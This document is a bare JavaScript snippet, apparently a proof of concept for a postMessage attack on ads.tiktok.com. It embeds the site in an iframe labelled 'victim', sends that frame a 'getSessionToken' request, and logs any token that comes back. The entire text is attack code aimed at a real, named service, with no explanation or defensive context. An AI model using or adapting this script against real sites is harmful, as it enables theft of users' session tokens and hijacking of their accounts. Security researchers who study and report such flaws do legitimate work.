<script>
  
const iframe = document.getElementById('victim');
iframe.onload = function () {
    iframe.contentWindow.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
};

window.addEventListener('message', (e) => {
    if (e.origin === 'https://ads.tiktok.com') {
        console.log('Token received from target:', e.data);
        
    }
});
  </script>
